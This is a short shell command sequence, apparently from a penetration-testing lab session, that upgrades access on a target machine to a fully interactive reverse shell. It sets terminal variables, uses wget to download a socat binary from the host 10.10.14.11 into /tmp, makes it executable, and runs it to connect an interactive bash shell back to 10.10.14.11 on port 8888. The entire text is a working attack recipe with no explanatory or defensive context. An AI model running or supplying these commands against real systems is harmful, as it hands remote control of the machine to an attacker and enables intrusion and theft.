export SHELL=bash;
export TERM=eterm-color;
stty rows 60 columns 126;
wget http://10.10.14.11/socat-x86_64 -O /tmp/socat;
chmod +x /tmp/socat;
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.11:8888;
